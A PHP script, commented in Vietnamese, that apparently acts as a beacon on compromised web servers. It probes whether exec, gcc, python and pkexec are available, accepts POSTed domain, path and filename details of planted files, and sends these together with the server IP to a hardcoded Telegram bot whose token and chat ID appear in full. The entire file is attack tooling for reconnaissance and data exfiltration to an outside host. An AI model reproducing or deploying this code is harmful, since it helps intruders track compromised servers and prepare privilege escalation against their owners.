<?php
// Function to check if a command exists
function commandExists($command) {
    $output = [];
    $result = 0;
    exec("command -v $command", $output, $result);
    return $result === 0;
}

// Function to check if a PHP function is enabled
function isFunctionEnabled($function) {
    return in_array($function, get_defined_functions()['internal']);
}

// Biến chứa thông tin để gửi qua Telegram
$telegramContent = "";

// Check system functions and command availability
$systemFunctionEnabled = isFunctionEnabled('exec');
$gccInstalled = commandExists('gcc');
$pythonInstalled = commandExists('python');
$pkexecInstalled = commandExists('pkexec');

// Nếu tất cả đều ON, thêm thông tin vào nội dung
if ($systemFunctionEnabled && $gccInstalled && $pythonInstalled && $pkexecInstalled) {
    $telegramContent .= "SYSTEM_FUNCTION: ON\nGCC: ON\nPYTHON: ON\nPKEXEC: ON\n";
}

// Xử lý yêu cầu POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['domain'], $data['path'], $data['filename'])) {
        $domain = rtrim($data['domain'], '/'); // Đảm bảo không có dấu '/' ở cuối
        $path = ltrim($data['path'], '/'); // Đảm bảo không có dấu '/' ở đầu
        $filename = $data['filename'];

        // Lấy ngày giờ hiện tại
        $dateTime = date('d/m/Y H:i:s');

        // Lấy IP của server
        $serverIP = $_SERVER['SERVER_ADDR'];

        // Cấu trúc thông tin từ yêu cầu
        $fullPath = "$domain/$path/$filename";
        $telegramContent .= "Domain: $domain\nDate: $dateTime\nServer IP: $serverIP\nFull Path: $fullPath\n";
    }
}

// Gửi nội dung qua Telegram nếu có thông tin để gửi
if (!empty($telegramContent)) {
    $chat_id = '7416297295';
    $bot_token = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($telegramContent);
    file_get_contents($telegram_url);
}
?>
